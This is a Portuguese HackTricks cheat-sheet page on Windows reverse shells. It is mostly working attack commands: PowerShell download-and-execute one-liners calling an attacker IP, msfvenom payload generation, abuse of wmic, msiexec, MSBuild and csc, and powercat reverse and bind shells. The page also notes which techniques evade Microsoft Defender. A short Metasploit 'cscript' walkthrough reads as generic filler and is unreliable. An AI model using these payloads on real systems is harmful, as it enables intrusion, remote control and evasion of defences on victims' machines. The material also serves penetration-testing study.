Encontre vulnerabilidades que são mais importantes para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha de tecnologia, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

O `cscript` é um utilitário de linha de comando do Windows que permite a execução de scripts em linguagens como VBScript e JScript. O Metasploit é uma poderosa ferramenta de teste de penetração que oferece uma ampla gama de recursos para explorar vulnerabilidades em sistemas.

Para usar o `cscript` com o Metasploit, você pode criar um script em VBScript ou JScript que execute comandos específicos para explorar uma vulnerabilidade. Em seguida, você pode usar o `cscript` para executar esse script no sistema alvo.

Aqui está um exemplo de como usar o `cscript` com o Metasploit:

1. Crie um script em VBScript ou JScript que execute um comando específico para explorar uma vulnerabilidade. Por exemplo, você pode criar um script que execute um comando para obter acesso ao sistema alvo.

2. Salve o script com uma extensão `.vbs` ou `.js`.

3. Abra o Metasploit Framework e inicie uma sessão de console.

4. Use o módulo `exploit/windows/script/cscript` para configurar o `cscript` como o interpretador de script.

5. Defina o caminho para o script que você criou usando a opção `SCRIPT_PATH`.

6. Execute o módulo usando o comando `exploit`.

O `cscript` com o Metasploit pode ser uma ferramenta poderosa para explorar vulnerabilidades em sistemas Windows. No entanto, é importante lembrar que o uso indevido dessa técnica pode ser ilegal e antiético. Sempre obtenha permissão adequada antes de realizar qualquer teste de penetração.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Detectado pelo defensor**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**Detectado pelo defensor**

## **MSIExec**

Atacante
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Vítima:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Detectado**

## **Wmic**
```
wmic os get /format:"https://webserver/payload.xsl"
```
Processo realizando chamada de rede: **wmic.exe**\
Carga gravada no disco: **cache local do IE**

Exemplo de arquivo xsl:
```
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
Extraído [aqui](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)

**Não detectado**

**Você pode baixar e executar facilmente um zombie Koadic usando o stager wmic**

## Msbuild
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**

Você pode usar essa técnica para contornar a Lista Branca de Aplicativos e as restrições do Powershell.exe. Pois você será solicitado com um shell do PS.\
Basta baixar isso e executá-lo: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**Não detectado**

## **CSC**

Compilar código C# na máquina da vítima.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
Você pode baixar um shell reverso básico em C# aqui: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**Não detectado**

## **Regasm/Regsvc**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**

**Eu não tentei**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf
```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**

**Eu não tentei**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Shells do Powershell

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

Na pasta **Shells**, existem vários tipos de shells diferentes. Para baixar e executar o Invoke-_PowerShellTcp.ps1_, faça uma cópia do script e adicione ao final do arquivo:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Comece a servir o script em um servidor web e execute-o no dispositivo da vítima:
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
O Defender ainda não detecta isso como código malicioso (ainda, 3/04/2019).

**TODO: Verificar outros shells do nishang**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Faça o download, inicie um servidor web, inicie o ouvinte e execute-o no computador da vítima:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
O Defender ainda não detecta isso como código malicioso (até o momento, 3/04/2019).

**Outras opções oferecidas pelo powercat:**

Shell de ligação, shell reverso (TCP, UDP, DNS), redirecionamento de porta, upload/download, gerar payloads, servir arquivos...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Crie um lançador do powershell, salve-o em um arquivo e faça o download e execute-o.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Detectado como código malicioso**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Crie uma versão em powershell de uma porta dos fundos do metasploit usando o unicorn
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Inicie o msfconsole com o recurso criado:
```
msfconsole -r unicorn.rc
```
Inicie um servidor web que sirva o arquivo _powershell\_attack.txt_ e execute no alvo:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**Detectado como código malicioso**

## Mais

[PS>Attack](https://github.com/jaredhaight/PSAttack) Console PS com alguns módulos ofensivos PS pré-carregados (cifrado)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) Console PS com alguns módulos ofensivos PS e detecção de proxy (IEX)

## Bibliografia

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

​

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que são mais importantes para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha de tecnologia, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
